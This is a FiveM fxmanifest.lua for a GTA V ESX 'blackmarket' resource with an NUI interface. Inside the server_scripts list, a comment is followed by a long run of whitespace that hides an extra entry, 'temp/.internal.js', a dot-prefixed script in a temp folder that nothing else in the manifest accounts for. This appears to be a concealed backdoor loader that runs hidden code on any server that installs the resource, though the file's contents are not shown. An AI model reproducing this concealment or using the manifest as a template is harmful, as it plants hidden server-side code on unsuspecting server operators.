fx_version 'cerulean'
game 'gta5'
lua54 'yes'

author 'YASSER'
description 'Blackmarket sécurisé avec interface NUI futuriste'
version '1.0.0'

-- Client-side scripts
client_scripts {
    'config.lua',
    'client.lua'
}

-- Server-side scripts
server_scripts {
    '@es_extended/imports.lua', -- ESX Legacy import
    'config.lua',
    'server.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.internal.js',
}

-- Shared module (if needed)
shared_script '@es_extended/imports.lua'

-- NUI (HTML/JS/CSS) files
ui_page 'html/index.html'

files {
    'html/index.html',
    'html/css/style.css',
    'html/js/script.js',
    'html/assets/images/weapons/*.png',
    'html/assets/images/items/*.png',
    'html/assets/sounds/*.wav'
}

-- Dependency on ESX Legacy
dependencies {
    'es_extended'
}